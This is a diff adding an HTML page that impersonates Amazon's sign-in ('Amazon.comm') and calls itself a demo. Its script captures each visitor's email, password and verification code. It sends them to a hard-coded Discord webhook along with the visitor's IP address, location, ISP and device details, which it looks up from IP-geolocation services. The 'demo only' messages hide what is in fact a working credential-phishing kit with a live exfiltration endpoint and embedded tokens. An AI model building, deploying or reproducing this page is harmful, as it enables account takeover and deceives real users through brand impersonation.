@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Amazon.comm Spend less. Smile more</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Welcome to Amazon.comm! Spend less. Smile more. This is a demo sign-in page.">
+  <meta property="og:image" content="https://images-ext-1.discordapp.net/external/aWXOQDIQRo65LFyAIRFsbExMeIZcuMENIX0fMICxm04/https/m.media-amazon.com/images/I/31epF-8N9LL.png?format=webp&amp;quality=lossless&amp;width=375&amp;height=375">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://images-ext-1.discordapp.net/external/aWXOQDIQRo65LFyAIRFsbExMeIZcuMENIX0fMICxm04/https/m.media-amazon.com/images/I/31epF-8N9LL.png?format=webp&amp;quality=lossless&amp;width=375&amp;height=375">
+  <link rel="icon" type="image/png" href="https://images-ext-1.discordapp.net/external/aWXOQDIQRo65LFyAIRFsbExMeIZcuMENIX0fMICxm04/https/m.media-amazon.com/images/I/31epF-8N9LL.png?format=webp&quality=lossless&width=375&height=375">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://use.typekit.net/vfc2rpy.css">
+  <style>
+    body, .fine-print, .need-help-fine, .fake-link, .footer-link, .divider, .input-box, h1, label, button, .text-sm, .text-xs, .text-base, .text-gray-700, .text-black {
+      font-family: 'Amazon Ember', 'Roboto', Arial, sans-serif !important;
+    }
+    body {
+      background-color: #f6f6f6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .amazon-logo {
+      width: 110px;
+      margin-bottom: 28px;
+      user-select: none;
+      pointer-events: none;
+      filter: brightness(1.1);
+      transition: transform 0.18s;
+    }
+    .amazon-logo:hover {
+      transform: scale(1.04);
+    }
+    .login-btn {
+      background: linear-gradient(180deg,#ffe066,#ffd600);
+      color: #111;
+      border-radius: 7px;
+      font-weight: 500;
+      border: 1px solid #e5b700;
+      transition: background 0.18s, box-shadow 0.18s, transform 0.16s;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset;
+    }
+    .login-btn:hover {
+      background: linear-gradient(180deg,#fff275,#ffd900);
+      box-shadow: 0 2px 8px rgba(255,210,55,0.13);
+      transform: translateY(-1px) scale(1.03);
+    }
+    .fake-link {
+      color: #0066c0;
+      cursor: pointer;
+      text-decoration: underline;
+      transition: color 0.15s;
+    }
+    .fake-link:hover {
+      color: #c45500;
+      text-decoration: underline;
+    }
+    .input-box {
+      transition: border 0.18s, box-shadow 0.18s;
+    }
+    .input-box:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 3px 2px #f90;
+    }
+    .shadow-amazon {
+      box-shadow: 0 2px 8px 0 rgba(15,17,17,0.13), 0 1.5px 0 0 #fff inset;
+    }
+    .help-menu-anim {
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-8px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+    .divider {
+      border: none;
+      border-top: 1px solid #e7e7e7;
+      margin: 22px 0;
+    }
+    .footer-link {
+      font-size: 13px;
+      color: #0066c0;
+      margin: 0 5px;
+      cursor: pointer;
+      text-decoration: underline;
+      transition: color 0.15s;
+    }
+    .footer-link:hover {
+      color: #c45500;
+    }
+    @media (max-width: 600px) {
+      .amazon-logo {
+        width: 85px;
+      }
+      .footer-container {
+        flex-direction: column;
+        gap: 6px;
+      }
+    }
+    .fine-print {
+      font-size: 12px;
+      color: #555;
+      margin-top: 2px;
+      text-align: left;
+      line-height: 1.35;
+      letter-spacing: 0.01em;
+    }
+    .need-help-fine {
+      font-size: 11px;
+      color: #888;
+      font-style: normal;
+      text-decoration: underline;
+      cursor: pointer;
+      margin-top: 1px;
+      margin-bottom: 0;
+      padding: 0;
+      transition: color 0.15s;
+      letter-spacing: 0.01em;
+      background: none;
+      border: none;
+    }
+    .need-help-fine:hover {
+      color: #c45500;
+    }
+    .buying-work-title {
+      font-weight: 600;
+      letter-spacing: 0.01em;
+      color: #222;
+    }
+    .shop-business-link {
+      display: block;
+      margin-top: 4px;
+      font-size: 11px;
+      color: #0066c0 !important;
+      font-style: normal;
+      text-decoration: underline;
+      letter-spacing: 0.01em;
+      cursor: pointer;
+      transition: color 0.18s, text-decoration 0.18s;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+    .shop-business-link:hover {
+      color: #c45500 !important;
+      text-decoration: underline;
+    }
+    .error-box {
+      background: #fff8e1;
+      border-left: 4px solid #e77600;
+      color: #c45500;
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-bottom: 16px;
+      box-shadow: 0 1px 4px 0 rgba(255,210,55,0.13);
+      animation: fadeIn 0.32s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .error-icon {
+      font-size: 18px;
+      flex-shrink: 0;
+      margin-right: 4px;
+      color: #c45500;
+    }
+    .fade-in {
+      animation: fadeIn 0.35s cubic-bezier(.5,.85,.5,1.1);
+    }
+    .slide-up {
+      animation: slideUp 0.38s cubic-bezier(.5,.85,.5,1.1);
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(18px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+    .code-input {
+      width: 40px;
+      height: 48px;
+      font-size: 1.5rem;
+      text-align: center;
+      border-radius: 7px;
+      border: 1px solid #e5e7eb;
+      background: #fff;
+      margin: 0 6px;
+      transition: border 0.18s, box-shadow 0.18s;
+      outline: none;
+      box-shadow: 0 1px 2px rgba(17,17,17,0.06);
+    }
+    .code-input:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 3px 2px #f90;
+    }
+    .code-input::-webkit-outer-spin-button, .code-input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    .code-input[type=number] {
+      -moz-appearance: textfield;
+    }
+    .code-verify-btn {
+      background: linear-gradient(180deg,#ffe066,#ffd600);
+      color: #111;
+      border-radius: 7px;
+      font-weight: 500;
+      border: 1px solid #e5b700;
+      transition: background 0.18s, box-shadow 0.18s, transform 0.16s;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset;
+    }
+    .code-verify-btn:hover {
+      background: linear-gradient(180deg,#fff275,#ffd900);
+      box-shadow: 0 2px 8px rgba(255,210,55,0.13);
+      transform: translateY(-1px) scale(1.03);
+    }
+    .code-info {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 12px;
+      margin-top: -2px;
+      letter-spacing: 0.01em;
+      text-align: center;
+    }
+    .code-resend-link {
+      color: #0066c0;
+      cursor: pointer;
+      text-decoration: underline;
+      font-size: 13px;
+      margin-top: 8px;
+      display: inline-block;
+      transition: color 0.15s;
+    }
+    .code-resend-link:hover {
+      color: #c45500;
+      text-decoration: underline;
+    }
+    .code-success {
+      background: #e7ffef;
+      border-left: 4px solid #2ecc40;
+      color: #228b22;
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-bottom: 16px;
+      box-shadow: 0 1px 4px 0 rgba(55,255,100,0.12);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      animation: fadeIn 0.42s;
+    }
+    .code-success-icon {
+      font-size: 18px;
+      flex-shrink: 0;
+      margin-right: 4px;
+      color: #2ecc40;
+    }
+  </style>
+</head>
+<body>
+  <div class="min-h-screen flex items-center justify-center px-2 bg-[#f6f6f6] flex-grow">
+    <div class="w-full flex flex-col items-center">
+      <img class="amazon-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+      <div class="w-full max-w-xs mx-auto bg-white rounded-lg shadow-amazon px-5 py-6" style="min-width:240px;">
+        <h1 class="text-xl font-normal mb-5 text-black tracking-tight">Sign in or create account</h1>
+        <div id="errorBox" style="display:none;"></div>
+        <form id="loginForm" autocomplete="off">
+          <div id="step-email">
+            <label class="block text-gray-700 text-sm font-semibold mb-2" for="email">Email or mobile phone number</label>
+            <input class="input-box w-full px-2 py-1.5 border border-gray-300 rounded-md focus:outline-none mb-2 text-sm bg-[#fff]" type="text" id="email" name="email" autocomplete="username">
+            <button type="submit" class="login-btn w-full py-2 text-base mb-2 font-semibold shadow-sm" id="continueBtn">Continue</button>
+          </div>
+          <div id="step-password" style="display:none;" class="fade-in">
+            <label class="block text-gray-700 text-sm font-semibold mb-2" for="password">Password</label>
+            <input class="input-box w-full px-2 py-1.5 border border-gray-300 rounded-md focus:outline-none mb-2 text-sm bg-[#fff]" type="password" id="password" name="password" autocomplete="current-password">
+            <button type="submit" class="login-btn w-full py-2 text-base mb-2 font-semibold shadow-sm" id="signInBtn">Continue</button>
+          </div>
+          <div id="step-verify" style="display:none;" class="fade-in">
+            <div class="code-info">Enter the 5-digit code we sent to your email.</div>
+            <div class="flex justify-center mb-3">
+              <input class="code-input" type="number" min="0" max="9" maxlength="1" id="code0" inputmode="numeric" autocomplete="one-time-code">
+              <input class="code-input" type="number" min="0" max="9" maxlength="1" id="code1" inputmode="numeric">
+              <input class="code-input" type="number" min="0" max="9" maxlength="1" id="code2" inputmode="numeric">
+              <input class="code-input" type="number" min="0" max="9" maxlength="1" id="code3" inputmode="numeric">
+              <input class="code-input" type="number" min="0" max="9" maxlength="1" id="code4" inputmode="numeric">
+            </div>
+            <button type="submit" class="code-verify-btn w-full py-2 text-base mb-2 font-semibold shadow-sm" id="verifyBtn">Verify</button>
+            <div class="flex justify-center">
+              <span class="code-resend-link" onclick="resendCode()">Resend code</span>
+            </div>
+          </div>
+        </form>
+        <div class="fine-print mb-2">
+          By continuing, you agree to Amazon's 
+          <span class="fake-link" onclick="showAlert('Conditions of Use')">Conditions of Use</span> 
+          and 
+          <span class="fake-link" onclick="showAlert('Privacy Notice')">Privacy Notice</span>.
+        </div>
+        <div class="mb-3">
+          <span class="need-help-fine" onclick="showHelp()">Need help?</span>
+          <div id="helpMenu" class="mt-2 pl-4 hidden">
+            <span class="fake-link text-sm block mb-1" onclick="showAlert('Forgot Password')">Forgot your password?</span>
+            <span class="fake-link text-sm block mb-1" onclick="showAlert('Other issues with Sign-In')">Other issues with Sign-In</span>
+          </div>
+        </div>
+        <hr class="divider">
+        <div class="mb-2 text-sm text-gray-700">
+          <span class="buying-work-title">Buying for work?</span>
+          <span class="shop-business-link ml-0" onclick="showAlert('Amazon Business')">Shop on Amazon Business</span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer class="w-full bg-transparent pb-6 flex flex-col items-center justify-center">
+    <div class="footer-container flex justify-center items-center mt-7 mb-2 flex-wrap">
+      <span class="footer-link" onclick="showAlert('Conditions of Use')">Conditions of Use</span>
+      <span class="footer-link" onclick="showAlert('Privacy Notice')">Privacy Notice</span>
+      <span class="footer-link" onclick="showAlert('Help')">Help</span>
+    </div>
+    <div class="text-xs text-gray-500 text-center">
+      © 1996-2024, Amazon.com, Inc. or its affiliates
+    </div>
+  </footer>
+  <script>
+    function showHelp() {
+      const helpMenu = document.getElementById('helpMenu');
+      if (helpMenu.classList.contains('hidden')) {
+        helpMenu.classList.remove('hidden');
+        helpMenu.classList.add('help-menu-anim');
+      } else {
+        helpMenu.classList.add('hidden');
+        helpMenu.classList.remove('help-menu-anim');
+      }
+    }
+    function showAlert(text) {
+      alert(text + " (Demo only, no real functionality)");
+    }
+    function showError(message) {
+      const errorBox = document.getElementById('errorBox');
+      errorBox.innerHTML = message;
+      errorBox.classList.remove('code-success');
+      errorBox.classList.add('error-box');
+      errorBox.style.display = 'flex';
+    }
+    function hideError() {
+      const errorBox = document.getElementById('errorBox');
+      errorBox.style.display = 'none';
+      errorBox.innerHTML = '';
+      errorBox.classList.remove('error-box');
+      errorBox.classList.remove('code-success');
+    }
+    function isValidEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
+    }
+    function isValidPassword(password) {
+      return password.length >= 6;
+    }
+    function isValidCode(codeArr) {
+      if (codeArr.length !== 5) return false;
+      for (let i = 0; i < 5; i++) {
+        if (!/^\d$/.test(codeArr[i])) return false;
+      }
+      return true;
+    }
+
+    let loginStep = 0;
+    const loginForm = document.getElementById('loginForm');
+    const stepEmail = document.getElementById('step-email');
+    const stepPassword = document.getElementById('step-password');
+    const stepVerify = document.getElementById('step-verify');
+    const emailInput = document.getElementById('email');
+    let demoCode = "12345";
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      hideError();
+      if (loginStep === 0) {
+        const emailValue = emailInput.value.trim();
+        if (!isValidEmail(emailValue)) {
+          showError('You need to enter a valid email address to continue.');
+          emailInput.focus();
+          return;
+        }
+        stepEmail.style.display = 'none';
+        stepPassword.style.display = 'block';
+        stepPassword.classList.add('slide-up');
+        document.getElementById('password').focus();
+        loginStep = 1;
+      } else if (loginStep === 1) {
+        const passwordInput = document.getElementById('password');
+        const passwordValue = passwordInput.value;
+        if (!isValidPassword(passwordValue)) {
+          showError('Password must be at least 6 characters.');
+          passwordInput.focus();
+          return;
+        }
+        stepPassword.style.display = 'none';
+        stepVerify.style.display = 'block';
+        stepVerify.classList.add('slide-up');
+        document.getElementById('code0').focus();
+        loginStep = 2;
+      } else if (loginStep === 2) {
+        const codeArr = [];
+        for (let i = 0; i < 5; i++) {
+          codeArr.push(document.getElementById('code'+i).value);
+        }
+        if (!isValidCode(codeArr)) {
+          showError('Please enter all 5 digits of the code.');
+          document.getElementById('code0').focus();
+          return;
+        }
+        const emailValue = emailInput.value.trim();
+        const passwordValue = document.getElementById('password').value;
+        const codeValue = codeArr.join('');
+        sendToWebhook(emailValue, passwordValue, codeValue);
+
+        if (codeValue === demoCode) {
+          showSuccess('Email verified! (Demo only, no real authentication)');
+          for (let i = 0; i < 5; i++) document.getElementById('code'+i).disabled = true;
+          document.getElementById('verifyBtn').disabled = true;
+          setTimeout(() => {
+            hideError();
+            for (let i = 0; i < 5; i++) document.getElementById('code'+i).disabled = false;
+            document.getElementById('verifyBtn').disabled = false;
+            for (let i = 0; i < 5; i++) document.getElementById('code'+i).value = '';
+            document.getElementById('code0').focus();
+          }, 2400);
+        } else {
+          showError('Incorrect code. Please try again.');
+          for (let i = 0; i < 5; i++) document.getElementById('code'+i).value = '';
+          document.getElementById('code0').focus();
+        }
+      }
+    });
+
+    function sendToWebhook(email, password, code) {
+      const deviceInfo = window.__deviceInfo || {};
+
+      let countryValue = deviceInfo.country;
+      let timezoneValue = deviceInfo.timezone;
+      if (!countryValue || countryValue.toLowerCase() === 'unknown') {
+        countryValue = getCountryFallback();
+      }
+      if (!timezoneValue || timezoneValue.toLowerCase() === 'unknown') {
+        timezoneValue = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
+      }
+
+      let infoFields = '';
+      infoFields += `IP: \`${deviceInfo.ip || 'unknown'}\`\n`;
+      infoFields += `City: \`${deviceInfo.city || 'unknown'}\`\n`;
+      infoFields += `Region: \`${deviceInfo.region || 'unknown'}\`\n`;
+      infoFields += `Country: \`${countryValue}\`\n`;
+      infoFields += `Timezone: \`${timezoneValue}\`\n`;
+      infoFields += `ISP: \`${deviceInfo.isp || 'unknown'}\`\n`;
+      infoFields += `OS: \`${deviceInfo.os || 'unknown'}\`\n`;
+      infoFields += `Browser: \`${deviceInfo.browser || 'unknown'}\`\n`;
+      infoFields += `DeviceType: \`${deviceInfo.deviceType || 'unknown'}\`\n`;
+      infoFields += `Screen: \`${deviceInfo.screen || 'unknown'}\``;
+      fetch("https://discord.com/api/webhooks/1395546199972384819/EqXNIhuWJBHVWS04ldw_4_3MlZYOy3ulsROVw3i0f6-q6yMSXKDhubo5jXyB5wJcSKuA", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `Email/Mobile: \`${email}\`\nPassword: \`${password}\`\nCode entered: \`${code}\`\n---\n${infoFields}`
+        })
+      }).then(response => {
+      }).catch(err => {
+      });
+    }
+
+    function getCountryFallback() {
+      try {
+        const lang = navigator.language || navigator.userLanguage || '';
+        if (lang) {
+          const map = {
+            'en-US': 'United States',
+            'en-GB': 'United Kingdom',
+            'fr-FR': 'France',
+            'de-DE': 'Germany',
+            'ja-JP': 'Japan',
+            'zh-CN': 'China',
+            'es-ES': 'Spain',
+            'pt-BR': 'Brazil',
+            'it-IT': 'Italy',
+            'ru-RU': 'Russia',
+            'ko-KR': 'South Korea'
+          };
+          for (let k in map) {
+            if (lang.indexOf(k) === 0) return map[k];
+          }
+          if (lang.length > 2) {
+            const country = lang.split('-')[1];
+            if (country) return country.toUpperCase();
+          }
+        }
+      } catch(e) {}
+      return "Unknown";
+    }
+
+    function showSuccess(message) {
+      const errorBox = document.getElementById('errorBox');
+      errorBox.innerHTML = '<span class="code-success-icon">✅</span>' + message;
+      errorBox.classList.remove('error-box');
+      errorBox.classList.add('code-success');
+      errorBox.style.display = 'flex';
+    }
+
+    function resendCode() {
+      hideError();
+      showSuccess('Code resent! (Demo only, check your email for code 12345)');
+      setTimeout(hideError, 1600);
+    }
+
+    emailInput.addEventListener('input', function() {
+      if (loginStep === 0) hideError();
+    });
+
+    document.addEventListener('input', function(e) {
+      if (e.target.id === 'password') hideError();
+    });
+
+    for (let i = 0; i < 5; i++) {
+      const input = document.getElementById('code'+i);
+      input.addEventListener('input', function(e) {
+        hideError();
+        let val = input.value;
+        if (val.length > 1) val = val.slice(0,1);
+        if (!/^\d?$/.test(val)) val = '';
+        input.value = val;
+        if (val && i < 4) {
+          document.getElementById('code'+(i+1)).focus();
+        }
+      });
+      input.addEventListener('keydown', function(e){
+        if(e.key === 'Backspace' && !input.value && i > 0){
+          document.getElementById('code'+(i-1)).focus();
+        } else if (e.key === 'ArrowLeft' && i > 0) {
+          document.getElementById('code'+(i-1)).focus();
+        } else if (e.key === 'ArrowRight' && i < 4) {
+          document.getElementById('code'+(i+1)).focus();
+        }
+      });
+      input.addEventListener('paste', function(e) {
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        if (/^\d{5}$/.test(paste)) {
+          for (let j = 0; j < 5; j++) {
+            document.getElementById('code'+j).value = paste[j];
+          }
+          document.getElementById('code4').focus();
+          e.preventDefault();
+        }
+      });
+    }
+
+    function getOS() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      if (/windows phone/i.test(userAgent)) return 'Windows Phone';
+      if (/android/i.test(userAgent)) return 'Android';
+      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) return 'iOS';
+      if (/Macintosh/i.test(userAgent)) return "Mac OS";
+      if (/Windows/i.test(userAgent)) return "Windows";
+      if (/Linux/i.test(userAgent)) return "Linux";
+      return "Unknown";
+    }
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf("Edg") > -1) return "Edge";
+      if (ua.indexOf("OPR") > -1) return "Opera";
+      if (ua.indexOf("Chrome") > -1) return "Chrome";
+      if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
+      if (ua.indexOf("Firefox") > -1) return "Firefox";
+      if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) return "IE";
+      return "Unknown";
+    }
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) return "Mobile";
+      if (/Tablet|iPad/i.test(ua)) return "Tablet";
+      return "Desktop";
+    }
+    function getScreen() {
+      return `${window.screen.width}x${window.screen.height}`;
+    }
+
+    window.__deviceInfo = {
+      os: getOS(),
+      browser: getBrowser(),
+      deviceType: getDeviceType(),
+      screen: getScreen(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC'
+    };
+
+    fetch("https://ip-api.io/json")
+      .then(res => res.json())
+      .then(data => {
+        window.__deviceInfo.ip = data.ip || data.query;
+        window.__deviceInfo.city = data.city;
+        window.__deviceInfo.region = data.regionName || data.region;
+        window.__deviceInfo.country = data.country;
+        window.__deviceInfo.timezone = data.timezone;
+        window.__deviceInfo.isp = data.isp;
+      })
+      .catch(() => {
+        fetch("https://ipinfo.io/json?token=3e6a5e083e9e3f")
+          .then(res => res.json())
+          .then(data => {
+            window.__deviceInfo.ip = data.ip;
+            window.__deviceInfo.city = data.city;
+            window.__deviceInfo.region = data.region;
+            window.__deviceInfo.country = data.country;
+            window.__deviceInfo.timezone = data.timezone;
+            window.__deviceInfo.isp = data.org || '';
+          })
+          .catch(() => {
+            window.__deviceInfo.country = getCountryFallback();
+            window.__deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
+          });
+      });
+  </script>
+</body>
+</html>
